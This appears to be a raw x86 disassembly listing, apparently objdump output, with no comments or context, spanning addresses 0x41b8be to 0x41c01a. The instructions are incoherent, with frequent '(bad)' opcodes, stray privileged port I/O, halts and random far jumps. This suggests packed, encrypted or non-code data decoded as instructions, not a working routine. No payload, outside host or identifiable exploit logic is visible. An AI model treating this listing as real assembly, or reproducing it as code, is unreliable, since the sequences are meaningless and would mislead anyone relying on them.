  41b8be:	jmp    0x41b899
  41b8c0:	sbb    DWORD PTR [esi-0x23],ecx
  41b8c3:	pop    esi
  41b8c4:	pop    esp
  41b8c5:	fcomp  QWORD PTR [ebp-0x586e4781]
  41b8cb:	dec    esi
  41b8cc:	or     DWORD PTR [ebx],0xffffffb9
  41b8cf:	retf   
  41b8d0:	jmp    0x2e32:0xb9c729d3
  41b8d7:	adc    BYTE PTR [eax],dl
  41b8d9:	xor    eax,DWORD PTR [edx]
  41b8db:	fwait
  41b8dc:	sbb    ebx,edi
  41b8de:	pop    eax
  41b8df:	and    al,0xc7
  41b8e1:	rcr    ch,1
  41b8e3:	adc    DWORD PTR ds:0x7f52fcab,edx
  41b8e9:	shl    BYTE PTR [edi-0x6a7a6d40],0x94
  41b8f0:	cmp    bh,bl
  41b8f2:	(bad)  
  41b8f3:	push   esi
  41b8f4:	cmp    ch,BYTE PTR [ebp-0x1fba4d2]
  41b8fa:	cld    
  41b8fb:	xor    esp,eax
  41b8fd:	inc    edi
  41b8fe:	rcl    DWORD PTR [ecx-0x37fb2658],1
  41b904:	fadd   QWORD PTR [ebx]
  41b906:	xchg   BYTE PTR [esi+0x2c0db689],dl
  41b90c:	jmp    0x5e58:0xe57257f2
  41b913:	mov    edx,0xc99931dd
  41b918:	jge    0x41b8e0
  41b91a:	push   ss
  41b91b:	mov    ds:0xda014fe6,al
  41b920:	fidivr WORD PTR [ebx-0x773ab74c]
  41b926:	call   0x1ecf:0x436c7e3
  41b92d:	popa   
  41b92e:	pop    ebx
  41b92f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b930:	stos   DWORD PTR es:[edi],eax
  41b931:	stos   DWORD PTR es:[edi],eax
  41b932:	or     cl,BYTE PTR [ecx]
  41b934:	faddp  st(5),st
  41b936:	in     eax,0xc5
  41b938:	pop    edx
  41b939:	pop    esi
  41b93a:	inc    edx
  41b93b:	xchg   ecx,eax
  41b93c:	dec    ecx
  41b93d:	pushf  
  41b93e:	mov    cs,ebx
  41b940:	xor    al,0x9a
  41b942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b943:	je     0x41b95c
  41b945:	push   es
  41b946:	rol    DWORD PTR ds:0xfad2c0eb,0x7f
  41b94d:	push   edi
  41b94e:	and    BYTE PTR [edx],cl
  41b950:	pop    ds
  41b951:	idiv   ah
  41b953:	test   eax,0x8fc71efa
  41b958:	lock adc al,0xde
  41b95b:	(bad)  
  41b95c:	sub    edx,DWORD PTR [ebp+0x5a]
  41b95f:	cmp    al,0xaf
  41b961:	mov    ch,0x44
  41b963:	sub    eax,0xd34ce23
  41b968:	in     eax,0xdf
  41b96a:	fcmovnb st,st(5)
  41b96c:	xor    al,0x1f
  41b96e:	mov    bl,0xae
  41b970:	sub    bl,bh
  41b972:	ds mov cl,0x16
  41b975:	add    eax,0x254aa99b
  41b97a:	std    
  41b97b:	dec    ecx
  41b97c:	lock clc 
  41b97e:	(bad)  
  41b97f:	inc    ebp
  41b980:	sbb    cl,dh
  41b982:	aad    0xc6
  41b984:	imul   ebx,DWORD PTR [ebp+0x1fab1c12],0x46
  41b98b:	shl    BYTE PTR [edi-0x2d],0xff
  41b98f:	jmp    FWORD PTR [edi]
  41b991:	inc    ecx
  41b992:	mov    DWORD PTR [ebx+ebp*1+0x2f],edi
  41b996:	jmp    DWORD PTR [esi+0xc]
  41b999:	fistp  WORD PTR [eax+0x12]
  41b99c:	mov    bh,0x7e
  41b99e:	ss gs mov ?,eax
  41b9a2:	div    ebx
  41b9a4:	pop    ebp
  41b9a5:	repnz xchg esi,eax
  41b9a7:	sbb    al,0x94
  41b9a9:	fistp  WORD PTR [edi-0x3b]
  41b9ac:	cld    
  41b9ad:	daa    
  41b9ae:	outs   dx,BYTE PTR ds:[esi]
  41b9af:	xlat   BYTE PTR ds:[ebx]
  41b9b0:	out    0x97,al
  41b9b2:	jg     0x41b991
  41b9b4:	nop
  41b9b5:	(bad)  
  41b9b6:	cmp    al,0x7d
  41b9b8:	sub    BYTE PTR [edx-0x517537af],ah
  41b9be:	test   al,0x99
  41b9c0:	in     al,dx
  41b9c1:	call   0x8b2a21f5
  41b9c6:	jp     0x41b9ca
  41b9c8:	jo     0x41b98f
  41b9ca:	mov    ebp,0x9182757c
  41b9cf:	stc    
  41b9d0:	clc    
  41b9d1:	fisttp WORD PTR ds:0x88426f41
  41b9d7:	fsubrp st(0),st
  41b9d9:	in     eax,dx
  41b9da:	repnz scas al,BYTE PTR es:[edi]
  41b9dc:	iret   
  41b9dd:	push   eax
  41b9de:	and    BYTE PTR [esi-0x15],bh
  41b9e1:	bts    DWORD PTR [esi],eax
  41b9e4:	jp     0x41ba3e
  41b9e6:	jl     0x41b9b1
  41b9e8:	pop    edi
  41b9e9:	out    dx,al
  41b9ea:	imul   esi,DWORD PTR [eax+0x1462006c],0x23fcda5c
  41b9f4:	pop    ebp
  41b9f5:	cmp    al,0x60
  41b9f7:	dec    esp
  41b9f8:	ss or  al,0x4e
  41b9fb:	enter  0x9aca,0x83
  41b9ff:	pop    edi
  41ba00:	sti    
  41ba01:	(bad)  
  41ba02:	call   0xc2c1a5f7
  41ba07:	test   eax,0x999bea20
  41ba0c:	arpl   di,bx
  41ba0e:	pop    es
  41ba0f:	pop    ss
  41ba10:	fstp   TBYTE PTR [esi+ebx*2+0x4b]
  41ba14:	ficomp WORD PTR [esi]
  41ba16:	add    dh,bh
  41ba18:	lahf   
  41ba19:	pop    eax
  41ba1a:	imul   ecx,ebp,0x9
  41ba1d:	outs   dx,DWORD PTR ds:[esi]
  41ba1e:	xchg   esi,eax
  41ba1f:	sbb    bl,BYTE PTR [eax]
  41ba21:	add    eax,0x3eeb601d
  41ba26:	ror    DWORD PTR [eax-0x6],cl
  41ba29:	dec    esi
  41ba2a:	or     eax,0x22d6eb0f
  41ba2f:	(bad)  
  41ba30:	cmp    eax,0xb380b900
  41ba35:	fist   WORD PTR [ebx+eiz*8-0x7b85b09b]
  41ba3c:	jne    0x41b9c3
  41ba3e:	std    
  41ba3f:	hlt    
  41ba40:	(bad)
  41ba43:	cmp    eax,0xc868e46a
  41ba48:	and    al,0x5
  41ba4a:	fisttp QWORD PTR [edi]
  41ba4c:	jae    0x41ba23
  41ba4e:	in     al,0x58
  41ba50:	jmp    0x1748edf4
  41ba55:	leave  
  41ba56:	mov    esi,0x8a23a928
  41ba5b:	enter  0x8ff0,0x5d
  41ba5f:	push   esi
  41ba60:	ret    
  41ba61:	in     eax,dx
  41ba62:	pop    edx
  41ba63:	cmc    
  41ba64:	pop    ebx
  41ba65:	idiv   ah
  41ba67:	push   es
  41ba68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba69:	call   0xc84a:0xb26377b9
  41ba70:	rcl    ecx,1
  41ba72:	pop    es
  41ba73:	iret   
  41ba74:	add    DWORD PTR [esi-0x56],esi
  41ba77:	sub    bl,0x72
  41ba7a:	push   ebx
  41ba7b:	hlt    
  41ba7c:	push   esp
  41ba7d:	ins    DWORD PTR es:[edi],dx
  41ba7e:	mov    DWORD PTR [esi+0x5e7de38],esi
  41ba84:	retf   
  41ba85:	lea    bx,[eax+ebp*2+0x33]
  41ba8a:	xchg   ecx,eax
  41ba8b:	setle  BYTE PTR [eax]
  41ba8e:	std    
  41ba8f:	pop    esi
  41ba90:	cwde   
  41ba91:	repz ret 0x8d1
  41ba95:	pop    ss
  41ba96:	rol    edi,1
  41ba98:	pop    es
  41ba99:	inc    ebp
  41ba9a:	mov    ebx,0x77cdbee4
  41ba9f:	stc    
  41baa0:	jmp    0x41baf2
  41baa2:	push   0xffffffac
  41baa4:	push   0x8ae35b1d
  41baa9:	fbld   TBYTE PTR [edi+0x1d0608aa]
  41baaf:	in     al,dx
  41bab0:	imul   eax,edx,0xdfff0d44
  41bab6:	jecxz  0x41ba48
  41bab8:	lea    ebp,[ebx-0x4b]
  41babb:	aas    
  41babc:	out    dx,al
  41babd:	fbld   TBYTE PTR [ebx+edx*4]
  41bac0:	pop    ebx
  41bac1:	sbb    al,0xc6
  41bac3:	xchg   esi,eax
  41bac4:	xchg   ecx,eax
  41bac5:	loop   0x41bac3
  41bac7:	and    DWORD PTR [edi],eax
  41bac9:	mov    esp,0x5502a2ee
  41bace:	(bad)  
  41bacf:	enter  0xbf2e,0xab
  41bad3:	in     eax,0xfb
  41bad5:	jle    0x41bacf
  41bad7:	(bad)  
  41bad8:	jmp    0x41ba71
  41bada:	xchg   esi,eax
  41badb:	dec    ebx
  41badc:	xchg   ecx,eax
  41badd:	iret   
  41bade:	dec    esi
  41badf:	into   
  41bae0:	push   ds
  41bae1:	dec    ebx
  41bae2:	pop    es
  41bae3:	leave  
  41bae4:	cmc    
  41bae5:	and    eax,0x6226dd7c
  41baea:	in     eax,0x2f
  41baec:	sbb    eax,0xe80afcc5
  41baf1:	pop    ecx
  41baf2:	das    
  41baf3:	hlt    
  41baf4:	rcl    BYTE PTR [edi+ebp*2-0x6803a435],cl
  41bafb:	mov    dl,0xba
  41bafd:	sub    al,0x77
  41baff:	ret    
  41bb00:	mov    esi,DWORD PTR [esi-0x1914d1aa]
  41bb06:	pop    ecx
  41bb07:	xlat   BYTE PTR ds:[ebx]
  41bb08:	imul   ebx,DWORD PTR [edi+esi*8-0x161fc187],0xffffff90
  41bb10:	mov    WORD PTR [edx],gs
  41bb12:	xchg   BYTE PTR [eax+0x6917a012],ch
  41bb18:	in     al,0xa5
  41bb1a:	movsx  esp,WORD PTR [eax+0x32]
  41bb1e:	mov    ebp,0x6c3b8a22
  41bb23:	fwait
  41bb24:	push   0xffffffdf
  41bb26:	jmp    0xb5b:0x43171e43
  41bb2d:	lods   al,BYTE PTR ds:[esi]
  41bb2e:	cld    
  41bb2f:	call   0x424a89a6
  41bb34:	adc    DWORD PTR [ecx-0x1bf83452],esi
  41bb3a:	add    eax,DWORD PTR [edx+eax*8]
  41bb3d:	js     0x41badd
  41bb3f:	mov    eax,ds:0x8c3eff77
  41bb44:	jmp    0x41bb8d
  41bb46:	in     al,dx
  41bb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb48:	loop   0x41bb47
  41bb4a:	mov    ds:0x4df212a,al
  41bb4f:	push   ebp
  41bb50:	and    al,0x1
  41bb52:	adc    eax,0xfd554353
  41bb57:	into   
  41bb58:	cld    
  41bb59:	sbb    al,0xf6
  41bb5b:	xchg   ecx,eax
  41bb5c:	xchg   edx,eax
  41bb5d:	aaa    
  41bb5e:	xchg   ecx,eax
  41bb5f:	leave  
  41bb60:	ds cli 
  41bb62:	clc    
  41bb63:	cmp    bh,BYTE PTR [ebx-0x70]
  41bb66:	sbb    eax,DWORD PTR [ebx+edi*8]
  41bb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb6a:	cld    
  41bb6b:	aas    
  41bb6c:	mov    ah,BYTE PTR [ebx]
  41bb6e:	pop    edi
  41bb6f:	mov    dh,0x72
  41bb71:	dec    ebx
  41bb72:	inc    esp
  41bb73:	enter  0xecc,0x66
  41bb77:	jmp    0x51eb:0x723f0c93
  41bb7e:	push   edx
  41bb7f:	imul   esi,DWORD PTR [eax-0x2a],0xffffffee
  41bb83:	cmp    DWORD PTR ds:0xf5c7f435,0x41
  41bb8a:	icebp  
  41bb8b:	dec    ebp
  41bb8c:	pop    esp
  41bb8d:	adc    ebx,DWORD PTR [edx-0x4f]
  41bb90:	jmp    0x41bb1c
  41bb92:	shl    bl,cl
  41bb94:	jecxz  0x41bb6c
  41bb96:	mov    edi,0x67df2b7a
  41bb9b:	dec    edx
  41bb9c:	add    edx,DWORD PTR [ebx]
  41bb9e:	xor    ah,BYTE PTR ds:0x51fd3c15
  41bba4:	jg     0x41bb42
  41bba6:	pop    edi
  41bba7:	je     0x41bc25
  41bba9:	and    al,0x1a
  41bbab:	mov    edi,0x47daefbc
  41bbb0:	imul   esi,DWORD PTR [eax],0x21
  41bbb3:	pop    esp
  41bbb4:	mov    ah,BYTE PTR [edi+0x8b998fc]
  41bbba:	xchg   esp,eax
  41bbbb:	push   esi
  41bbbc:	cld    
  41bbbd:	sbb    DWORD PTR [edx],eax
  41bbbf:	enter  0x3b52,0xc8
  41bbc3:	out    dx,al
  41bbc4:	pop    ebx
  41bbc5:	sahf   
  41bbc6:	aad    0xe
  41bbc8:	xchg   esi,eax
  41bbc9:	out    0xfc,eax
  41bbcb:	pand   mm2,mm5
  41bbce:	sbb    al,0x7b
  41bbd0:	fwait
  41bbd1:	stos   BYTE PTR es:[edi],al
  41bbd2:	mov    ecx,cs
  41bbd4:	in     eax,dx
  41bbd5:	inc    edi
  41bbd6:	js     0x41bc15
  41bbd8:	sahf   
  41bbd9:	and    dh,cl
  41bbdb:	out    0x1e,eax
  41bbdd:	lods   eax,DWORD PTR ds:[esi]
  41bbde:	add    ah,BYTE PTR [edi+edi*8-0x7e]
  41bbe2:	test   BYTE PTR [edx],al
  41bbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbe5:	sbb    BYTE PTR [ebp+0x8],ah
  41bbe8:	sub    esp,DWORD PTR [ecx+edx*2-0x6020b0ca]
  41bbef:	std    
  41bbf0:	adc    al,0x92
  41bbf2:	lods   al,BYTE PTR ds:[esi]
  41bbf3:	jne    0x41bb8c
  41bbf5:	test   eax,0x180c0ff3
  41bbfa:	xchg   esp,eax
  41bbfb:	mov    BYTE PTR [edi],dh
  41bbfd:	cmp    eax,0xdcec81c1
  41bc02:	mov    eax,ds:0xdeaefadd
  41bc07:	pop    ecx
  41bc08:	or     esp,DWORD PTR [eax]
  41bc0a:	addr16 mov bh,0xeb
  41bc0d:	add    ah,dl
  41bc0f:	test   al,0x3d
  41bc11:	ret    
  41bc12:	jmp    0x6b32:0xac08391e
  41bc19:	cld    
  41bc1a:	and    ebp,DWORD PTR [edx-0x51]
  41bc1d:	test   BYTE PTR [ecx+ecx*2+0x3f8f46ea],bl
  41bc24:	push   eax
  41bc25:	fidivr DWORD PTR [edi-0x3ddcadc0]
  41bc2b:	enter  0xb7a2,0xc
  41bc2f:	scas   al,BYTE PTR es:[edi]
  41bc30:	imul   eax,eax,0x7f5b35d9
  41bc36:	hlt    
  41bc37:	cmp    bh,bh
  41bc39:	adc    dl,BYTE PTR [ecx]
  41bc3b:	push   0x7ef21b63
  41bc40:	or     bl,bh
  41bc42:	mov    edx,0xa9021203
  41bc47:	icebp  
  41bc48:	test   dh,dl
  41bc4a:	fwait
  41bc4b:	mov    BYTE PTR [eax-0x34],ch
  41bc4e:	loopne 0x41bc26
  41bc50:	mov    ds:0x99a7fc2a,al
  41bc55:	out    0x25,eax
  41bc57:	mov    al,ds:0x41806fab
  41bc5c:	jge    0x41bc3d
  41bc5e:	repnz add ecx,DWORD PTR [edi+0x30cee31f]
  41bc65:	dec    edi
  41bc66:	add    bh,BYTE PTR [ebx+0x49]
  41bc69:	xchg   ecx,eax
  41bc6a:	jge    0x41bc83
  41bc6c:	mul    BYTE PTR [edi]
  41bc6e:	stos   BYTE PTR es:[edi],al
  41bc6f:	leave  
  41bc70:	mov    eax,ds
  41bc72:	(bad)  
  41bc73:	xor    ebx,DWORD PTR [edx-0xc]
  41bc76:	pushf  
  41bc77:	in     al,0xdd
  41bc79:	enter  0xb90c,0xeb
  41bc7d:	test   edi,ebx
  41bc7f:	das    
  41bc80:	adc    eax,0x8b739be8
  41bc85:	add    esi,DWORD PTR [eax+0x59df1e92]
  41bc8b:	sub    cl,BYTE PTR es:[edx-0x4914b341]
  41bc92:	(bad)  
  41bc93:	fs jl  0x41bc53
  41bc96:	lods   eax,DWORD PTR ds:[esi]
  41bc97:	add    eax,0x4766df84
  41bc9c:	out    dx,eax
  41bc9d:	jne    0x41bc40
  41bc9f:	pop    esi
  41bca0:	leave  
  41bca1:	mov    edi,0xf9f8bbfc
  41bca6:	popf   
  41bca7:	aaa    
  41bca8:	ss scas al,BYTE PTR es:[edi]
  41bcaa:	hlt    
  41bcab:	(bad)  
  41bcac:	xor    ebp,DWORD PTR [ebx]
  41bcae:	mov    ebp,esp
  41bcb0:	mov    ebx,0x1adb49f4
  41bcb5:	xor    edx,esi
  41bcb7:	cs out dx,al
  41bcb9:	cmp    eax,0x1f165192
  41bcbe:	pop    es
  41bcbf:	or     eax,0xc8cc5e12
  41bcc4:	xor    cl,BYTE PTR [eax-0x2b]
  41bcc7:	fisttp WORD PTR ds:0xebef798f
  41bccd:	out    0xb9,al
  41bccf:	gs mov ah,0x79
  41bcd2:	inc    ecx
  41bcd3:	xor    edi,ebx
  41bcd5:	fild   QWORD PTR [esi+0x138e6b4e]
  41bcdb:	and    ebp,DWORD PTR [esi-0x44]
  41bcde:	cld    
  41bcdf:	mov    ch,0x33
  41bce1:	and    BYTE PTR [eax],al
  41bce3:	and    DWORD PTR [ebx-0x7f],edi
  41bce6:	(bad)  
  41bce7:	adc    al,0xa1
  41bce9:	sti    
  41bcea:	jge    0x41bcc1
  41bcec:	fcomp  st(7)
  41bcee:	aas    
  41bcef:	inc    esi
  41bcf0:	sub    al,0x66
  41bcf2:	stos   BYTE PTR es:[edi],al
  41bcf3:	shr    bl,1
  41bcf5:	dec    esi
  41bcf6:	inc    edx
  41bcf7:	outs   dx,DWORD PTR ds:[esi]
  41bcf8:	(bad)  
  41bcf9:	sti    
  41bcfa:	push   0xd6df99ca
  41bcff:	ss push cs
  41bd01:	jns    0x41bd3b
  41bd03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd04:	mov    ds:0xa7f4e64a,eax
  41bd09:	fisttp WORD PTR [edi-0x41]
  41bd0c:	(bad)  
  41bd0d:	fadd   QWORD PTR [edx-0x55]
  41bd10:	cmp    eax,0x4ac85e67
  41bd15:	jmp    0x41bcaa
  41bd17:	outs   dx,DWORD PTR ds:[esi]
  41bd18:	adc    ecx,ebx
  41bd1a:	push   edi
  41bd1b:	daa    
  41bd1c:	jmp    0x41bccd
  41bd1e:	ins    DWORD PTR es:[edi],dx
  41bd1f:	mov    dl,0x44
  41bd21:	add    eax,ecx
  41bd23:	shr    BYTE PTR [ecx],1
  41bd25:	fucomip st,st(2)
  41bd27:	minps  xmm7,XMMWORD PTR [ebx-0x7be4ce55]
  41bd2e:	cli    
  41bd2f:	(bad)  
  41bd30:	sti    
  41bd31:	cmp    dl,BYTE PTR [ecx+edx*4+0x5ee11a2b]
  41bd38:	fbstp  TBYTE PTR gs:[ebp+0x6776f45c]
  41bd3f:	xor    ecx,DWORD PTR [edx-0x5759fbae]
  41bd45:	int3   
  41bd46:	cld    
  41bd47:	data16 aas 
  41bd49:	fisttp QWORD PTR [edx+0x15e03314]
  41bd4f:	retf   
  41bd50:	xchg   esi,eax
  41bd51:	aas    
  41bd52:	mov    BYTE PTR [eax+0x4fe641b5],cl
  41bd58:	jmp    0x41bce9
  41bd5a:	sbb    eax,0x45c150cf
  41bd5f:	pop    es
  41bd60:	rcr    ecx,0x91
  41bd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd64:	or     ebx,esp
  41bd66:	mov    esp,0x824ab599
  41bd6b:	cli    
  41bd6c:	jmp    0x41bd4b
  41bd6e:	rcr    BYTE PTR [ebx+0x3936c451],0x50
  41bd75:	or     ah,ah
  41bd77:	adc    ch,bl
  41bd79:	push   ss
  41bd7a:	mov    ch,ch
  41bd7c:	dec    edi
  41bd7d:	mov    dh,0xe6
  41bd7f:	daa    
  41bd80:	xchg   ebp,eax
  41bd81:	inc    eax
  41bd82:	std    
  41bd83:	xchg   esp,eax
  41bd84:	stc    
  41bd85:	addr16 jno 0x41bdc9
  41bd88:	icebp  
  41bd89:	inc    esp
  41bd8a:	push   0x20d88eb7
  41bd8f:	enter  0x1b20,0xbe
  41bd93:	ins    DWORD PTR es:[edi],dx
  41bd94:	in     eax,dx
  41bd95:	mov    esp,0x12fa3cfc
  41bd9a:	pop    ss
  41bd9b:	(bad)  
  41bd9d:	and    edi,DWORD PTR [edi]
  41bd9f:	enter  0x5ac7,0x92
  41bda3:	xchg   BYTE PTR [eax-0x4],cl
  41bda6:	(bad)  
  41bda7:	pop    edi
  41bda8:	jmp    0x41bd76
  41bdaa:	pop    es
  41bdab:	cdq    
  41bdac:	addr16 retf 
  41bdae:	sub    dl,ch
  41bdb0:	data16 fldcw WORD PTR [ebx]
  41bdb3:	scas   eax,DWORD PTR es:[edi]
  41bdb4:	es daa 
  41bdb6:	fst    QWORD PTR [eax+0x2e]
  41bdb9:	mov    ah,0x61
  41bdbb:	mov    al,ds:0x623b58f7
  41bdc0:	inc    esp
  41bdc1:	fild   WORD PTR [ebp+0x56]
  41bdc4:	pop    edi
  41bdc5:	(bad)  
  41bdc6:	mov    al,0xd2
  41bdc8:	loop   0x41bdba
  41bdca:	call   0xbd80:0x6fe09429
  41bdd1:	dec    edi
  41bdd2:	cmp    al,0xa0
  41bdd4:	retf   
  41bdd5:	jbe    0x41bdd4
  41bdd7:	ins    DWORD PTR es:[edi],dx
  41bdd8:	xor    BYTE PTR ds:0x633ac619,bh
  41bdde:	sub    eax,0xe4f003c5
  41bde3:	push   ecx
  41bde4:	add    BYTE PTR [eax-0x27],ah
  41bde7:	addr16 cli 
  41bde9:	out    dx,al
  41bdea:	cld    
  41bdeb:	xchg   ah,cl
  41bded:	and    eax,0xe79a1413
  41bdf2:	ja     0x41bdc3
  41bdf4:	out    0x18,eax
  41bdf6:	out    dx,eax
  41bdf7:	daa    
  41bdf8:	mov    ah,0xdd
  41bdfa:	jl     0x41be61
  41bdfc:	xor    BYTE PTR [ecx+0x21],0xf3
  41be00:	call   0x9df34d27
  41be05:	cmp    edi,DWORD PTR [ebp-0x3a]
  41be08:	repz loop 0x41bdc3
  41be0b:	call   0x5cd8:0x9b94dfd4
  41be12:	inc    edi
  41be13:	addr16 jb 0x41be50
  41be16:	std    
  41be17:	or     BYTE PTR [edx],bh
  41be19:	jne    0x41bde2
  41be1b:	pop    eax
  41be1c:	mov    BYTE PTR [esi+0x3b],ch
  41be1f:	loop   0x41bdbf
  41be21:	push   esi
  41be22:	push   0x7e856b9a
  41be27:	xor    edx,DWORD PTR ss:[eax+edi*8-0x4]
  41be2c:	jmp    0x41be78
  41be2e:	lahf   
  41be2f:	sbb    dh,BYTE PTR [edx+eax*4]
  41be32:	add    eax,0x21df26ed
  41be37:	mov    DWORD PTR [esi-0x2d],ebx
  41be3a:	lahf   
  41be3b:	push   ss
  41be3c:	mov    ch,0xb3
  41be3e:	cld    
  41be3f:	and    eax,0xb8f6afdd
  41be44:	stc    
  41be45:	int3   
  41be46:	aaa    
  41be47:	out    dx,al
  41be48:	push   ebx
  41be49:	out    dx,eax
  41be4a:	test   bh,0x4
  41be4d:	loop   0x41be65
  41be4f:	or     BYTE PTR [edi+0x6c],bl
  41be52:	stos   DWORD PTR es:[edi],eax
  41be53:	(bad)  
  41be54:	jmp    0x41be76
  41be56:	add    eax,0xf35fadf7
  41be5b:	mov    eax,0xe4a07f3b
  41be60:	push   ebx
  41be61:	fstp   QWORD PTR [eax+0x6078e03b]
  41be67:	mov    ch,BYTE PTR [ebx+0x1fa4506b]
  41be6d:	ins    DWORD PTR es:[edi],dx
  41be6e:	std    
  41be6f:	loop   0x41bec3
  41be71:	push   es
  41be72:	inc    ebx
  41be73:	mov    ds:0xceffb183,eax
  41be78:	xchg   edi,eax
  41be79:	or     al,0x55
  41be7b:	out    dx,al
  41be7c:	or     esi,DWORD PTR [ebx-0x7301670c]
  41be82:	xchg   ecx,eax
  41be83:	inc    esp
  41be84:	jmp    0x41be56
  41be86:	cwde   
  41be87:	push   0x9
  41be89:	jns    0x41be13
  41be8b:	lahf   
  41be8c:	xchg   edx,eax
  41be8d:	fistp  QWORD PTR [ecx+ecx*1]
  41be90:	add    al,0xdb
  41be92:	and    ah,BYTE PTR [eax-0x31d77a6b]
  41be98:	sbb    esi,ecx
  41be9a:	cld    
  41be9b:	sub    eax,0x3eba0d3f
  41bea0:	(bad)  
  41bea1:	adc    al,0x75
  41bea3:	enter  0xb9a8,0x61
  41bea7:	mov    bh,0x6a
  41bea9:	jmp    0x41bee3
  41beab:	jl     0x41be99
  41bead:	stos   BYTE PTR es:[edi],al
  41beae:	retf   0x9dff
  41beb1:	cwde   
  41beb2:	aas    
  41beb3:	dec    esp
  41beb4:	pop    es
  41beb5:	sahf   
  41beb6:	das    
  41beb7:	push   ss
  41beb8:	arpl   di,bx
  41beba:	call   0x983:0x8163cbfd
  41bec1:	cmp    edi,ebp
  41bec3:	lods   eax,DWORD PTR ds:[esi]
  41bec4:	ret    
  41bec5:	xlat   BYTE PTR ds:[ebx]
  41bec6:	inc    ebx
  41bec7:	dec    ebx
  41bec8:	aaa    
  41bec9:	cmp    bh,bh
  41becb:	call   0x8224:0x444edf8c
  41bed2:	enter  0x1046,0x72
  41bed6:	std    
  41bed7:	es inc esi
  41bed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beda:	sub    edx,ebp
  41bedc:	je     0x41bf47
  41bede:	js     0x41bea8
  41bee0:	mov    edx,0x664a79ed
  41bee5:	dec    edx
  41bee6:	or     DWORD PTR [esi-0x15],esi
  41bee9:	push   ebp
  41beea:	jle    0x41bec4
  41beec:	ret    0xe79d
  41beef:	adc    ah,BYTE PTR [edi+0x375659df]
  41bef5:	xchg   BYTE PTR [edi],ch
  41bef7:	mov    dh,0x3d
  41bef9:	inc    esp
  41befa:	std    
  41befb:	sub    eax,0xc1815e63
  41bf00:	out    0x9a,eax
  41bf02:	dec    eax
  41bf03:	enter  0x88d,0x85
  41bf07:	loope  0x41be9c
  41bf09:	add    eax,DWORD PTR [edx]
  41bf0b:	cmp    ebp,ebx
  41bf0d:	repz adc eax,0x247d4f19
  41bf13:	(bad)  
  41bf14:	ja     0x41bef5
  41bf16:	add    dh,dl
  41bf18:	jae    0x41beab
  41bf1a:	mov    ecx,DWORD PTR [edx+0x50fd803e]
  41bf20:	add    DWORD PTR [edx-0x265504b],edi
  41bf26:	push   ds
  41bf27:	enter  0x4afb,0x56
  41bf2b:	dec    esi
  41bf2c:	mov    ds:0xebe5d6a4,al
  41bf31:	into   
  41bf32:	jg     0x41bf95
  41bf34:	jge    0x41bf42
  41bf36:	fldcw  WORD PTR [eax+0x4516dfd7]
  41bf3c:	xor    al,0xb1
  41bf3e:	btr    DWORD PTR [eax-0x58],eax
  41bf42:	cld    
  41bf43:	jns    0x41bfaf
  41bf45:	out    dx,eax
  41bf46:	jmp    0x8ebc:0x74212b34
  41bf4d:	sub    eax,0x4b10c84c
  41bf52:	call   0xfdc0d546
  41bf57:	pop    ecx
  41bf58:	push   ebx
  41bf59:	leave  
  41bf5a:	xchg   DWORD PTR [edi],ebx
  41bf5c:	jecxz  0x41bf44
  41bf5e:	xor    eax,ecx
  41bf60:	and    eax,0x1835e955
  41bf65:	add    DWORD PTR [esi+0x8],ecx
  41bf68:	jmp    0x41bf81
  41bf6a:	jl     0x41bfeb
  41bf6c:	jge    0x41bfa9
  41bf6e:	aam    0x87
  41bf70:	imul   ebx,edi,0xffffff9d
  41bf73:	aas    
  41bf74:	and    BYTE PTR [edi-0x77e79a21],al
  41bf7a:	std    
  41bf7b:	push   eax
  41bf7c:	scas   eax,DWORD PTR es:[edi]
  41bf7d:	mov    ecx,0xa593bdc2
  41bf82:	pushf  
  41bf83:	mov    edi,0x882aade7
  41bf88:	adc    BYTE PTR fs:[ebp-0x40],0xa1
  41bf8d:	or     edi,ebp
  41bf8f:	dec    edx
  41bf90:	popa   
  41bf91:	sub    al,0xc9
  41bf93:	push   eax
  41bf94:	or     al,0xc8
  41bf96:	icebp  
  41bf97:	mov    esp,0x85162aad
  41bf9c:	fiadd  DWORD PTR [esi+0x79]
  41bf9f:	or     eax,DWORD PTR [edx]
  41bfa1:	stos   DWORD PTR es:[edi],eax
  41bfa2:	jl     0x41bfc1
  41bfa4:	ror    DWORD PTR [eax-0x3],cl
  41bfa7:	mov    esi,0xd88a1310
  41bfac:	and    eax,0xec8bc47
  41bfb1:	jl     0x41bfc4
  41bfb3:	adc    al,0x96
  41bfb5:	stos   DWORD PTR es:[edi],eax
  41bfb6:	sub    BYTE PTR [edx-0x15],cl
  41bfb9:	bound  edx,QWORD PTR [ecx+0x2610f6f3]
  41bfbf:	and    esp,ecx
  41bfc1:	lds    ebp,FWORD PTR [esi]
  41bfc3:	mov    edx,0xc83e655e
  41bfc8:	imul   esi,DWORD PTR [edi-0x5],0xfffffff9
  41bfcc:	fnstenv [ebp+edi*8+0x17]
  41bfd0:	ins    DWORD PTR es:[edi],dx
  41bfd1:	inc    esi
  41bfd2:	lock aad 0xcb
  41bfd5:	fs xor al,0xc9
  41bfd8:	fld    TBYTE PTR [esi+0x5200c303]
  41bfde:	out    0xa7,eax
  41bfe0:	sub    dl,BYTE PTR [esi-0x2]
  41bfe3:	mov    al,0xf7
  41bfe5:	arpl   si,di
  41bfe7:	and    eax,0x219d0f8e
  41bfec:	mov    WORD PTR [esi-0x32],?
  41bfef:	mov    edx,DWORD PTR [edi]
  41bff1:	loop   0x41c023
  41bff3:	retf   
  41bff4:	mov    ds:0xfb1170ff,al
  41bff9:	je     0x41bf98
  41bffb:	inc    edi
  41bffc:	mov    eax,cs:0xf7e8e998
  41c002:	and    BYTE PTR [eax],0x65
  41c005:	(bad)  
  41c006:	mov    al,ds:0x1625ed6b
  41c00b:	pop    ebx
  41c00c:	scas   al,BYTE PTR es:[edi]
  41c00d:	or     DWORD PTR [ebp+0x39],ebx
  41c010:	mov    cl,BYTE PTR [ebx+0x54]
  41c013:	push   ebp
  41c014:	jmp    0x41bfd7
  41c016:	push   edx
  41c017:	pop    esp
  41c018:	repnz dec esi
  41c01a:	pushf  
